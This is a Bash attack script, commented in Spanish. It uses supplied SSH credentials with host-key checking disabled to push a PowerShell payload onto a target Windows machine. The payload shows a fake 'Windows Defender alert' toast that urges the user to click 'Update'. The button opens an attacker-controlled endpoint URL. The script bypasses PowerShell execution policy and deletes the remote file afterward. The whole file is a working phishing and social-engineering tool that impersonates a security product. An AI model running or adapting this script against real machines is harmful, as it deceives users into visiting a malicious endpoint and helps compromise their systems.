#!/usr/bin/env bash

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
ENDPOINT_INFO_FILE="/tmp/endpoint_info.txt"

echo "================================================"
echo "   ATAQUE SSH + ENDPOINT + MENSAJE WINDOWS"
echo "================================================"
echo

echo -e "${BLUE}[PASO 1/3] Configuración del objetivo${NC}"
echo

read -p "Ingresa la IP del dispositivo Windows objetivo: " TARGET_IP

if ! [[ "$TARGET_IP" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
    echo -e "${RED}ERROR: IP inválida. Formato esperado: 192.168.x.x${NC}"
    exit 1
fi

echo -e "${GREEN}✓ IP objetivo: $TARGET_IP${NC}"
echo

echo -e "${BLUE}[PASO 2/3] Verificando conectividad SSH...${NC}"
echo

read -p "Usuario SSH (presiona Enter para usar el usuario actual '$USER'): " SSH_USER
SSH_USER=${SSH_USER:-$USER}

read -s -p "Ingresa la contraseña SSH: " SSH_PASSWORD
echo
echo

echo "Intentando conectar SSH a $SSH_USER@$TARGET_IP..."
echo

# Intentar conexión SSH con timeout de 10 segundos
SSH_SUCCESS=false

if sshpass -p "$SSH_PASSWORD" ssh -o ConnectTimeout=10 \
                   -o StrictHostKeyChecking=no \
                   "$SSH_USER@$TARGET_IP" "echo 'SSH OK'" 2>/dev/null; then
    SSH_SUCCESS=true
    echo -e "${GREEN}✓ Conexión SSH exitosa!${NC}"
else
    echo -e "${RED}ERROR: No se pudo conectar con la contraseña proporcionada${NC}"
    exit 1
fi

echo

# ============================================
# PASO 3: Enviar notificación Toast
# ============================================
echo -e "${BLUE}[PASO 3/3] Enviando notificación Toast...${NC}"
echo

# Verificar que el endpoint esté activo
if [ ! -f "$ENDPOINT_INFO_FILE" ]; then
    echo -e "${RED}ERROR: El endpoint no está activo o no generó su información${NC}"
    exit 1
fi

# Leer información del endpoint
source "$ENDPOINT_INFO_FILE"

echo -e "${GREEN}✓ Endpoint activo en: $URL${NC}"
echo


# Crear script PowerShell que muestra mensaje con acción
TOAST_SCRIPT=$(cat <<'PWSH_EOF'

Write-Host "Mostrando notificación Toast con opción para abrir endpoint..."
Start-Sleep -Seconds 3
try {
    # Instalar BurntToast si no está
    if (!(Get-Module -ListAvailable -Name BurntToast)) {
        Install-Module BurntToast -Force -Confirm:$false -Scope CurrentUser
    }
    Import-Module BurntToast -ErrorAction Stop
    
    # Crear header
    $header = New-BTHeader -Id 'threat' -Title 'Alerta de Windows Defender'
    
    # Crear botón para abrir endpoint
    $button = New-BTButton -Content 'Actualizar' -Arguments 'ENDPOINT_URL_PLACEHOLDER'
    
    # Mostrar notificación
    New-BurntToastNotification -Header $header -Text 'ALERTA DE WINDOWS DEFENDER', 'Se requiere actualizar Windows Defender', 'Haz clic en Actualizar' -Button $button
    
    Write-Host "Notificación Toast enviada con BurntToast"
} catch {
    Write-Host "Error con BurntToast: $($_.Exception.Message)"
}

Write-Host "Mensaje mostrado"
PWSH_EOF
)

# Reemplazar placeholder con URL real
TOAST_SCRIPT="${TOAST_SCRIPT//ENDPOINT_URL_PLACEHOLDER/$URL}"

# Guardar script temporalmente
TEMP_PS1="/tmp/send_toast_notification.ps1"
echo "$TOAST_SCRIPT" > "$TEMP_PS1"

# Enviar y ejecutar script en Windows vía SSH
if [ "$SSH_SUCCESS" = true ]; then
    echo "Enviando script PowerShell vía SSH..."
    
    # Copiar script al Windows remoto
    if sshpass -p "$SSH_PASSWORD" scp -o ConnectTimeout=10 \
           -o StrictHostKeyChecking=no \
           "$TEMP_PS1" "$SSH_USER@$TARGET_IP:C:/Windows/Temp/notification.ps1" 2>/dev/null; then
        
        echo "Ejecutando notificación en Windows..."
        
        # Ejecutar PowerShell remoto
        sshpass -p "$SSH_PASSWORD" ssh -o ConnectTimeout=10 \
            -o StrictHostKeyChecking=no \
            "$SSH_USER@$TARGET_IP" \
            "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\notification.ps1" 2>/dev/null
        
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}✓ Mensaje con acción enviado! El usuario puede hacer clic en OK para abrir el endpoint.${NC}"
        else
            echo -e "${YELLOW}⚠ El mensaje pudo no mostrarse (permisos o configuración)${NC}"
        fi
        
        # Limpiar archivo remoto
        sshpass -p "$SSH_PASSWORD" ssh -o ConnectTimeout=10 \
            -o StrictHostKeyChecking=no \
            "$SSH_USER@$TARGET_IP" \
            "del C:\\Windows\\Temp\\notification.ps1" 2>/dev/null || true
    else
        echo -e "${YELLOW}⚠ No se pudo copiar el script vía SCP${NC}"
    fi
else
    echo -e "${YELLOW}⚠ SSH no disponible, mostrando instrucciones manuales...${NC}"
    echo
    echo "Para enviar la notificación manualmente, ejecuta este comando en el Windows objetivo:"
    echo "---"
    echo "$TOAST_SCRIPT" | grep -v "^#"
    echo "---"
fi

# Limpiar archivo temporal
rm -f "$TEMP_PS1"

echo
echo "================================================"
echo "               OPERACIÓN COMPLETA"
echo "================================================"
echo -e "${GREEN}✓ Endpoint activo: $URL${NC}"
echo -e "${GREEN}✓ Objetivo: $TARGET_IP${NC}"
echo -e "${GREEN}✓ Mensaje con acción enviado${NC}"
echo
echo "El endpoint continúa ejecutándose en segundo plano."
echo "Para detenerlo, usa el script AttackAutomatization.sh o cierra manualmente."
echo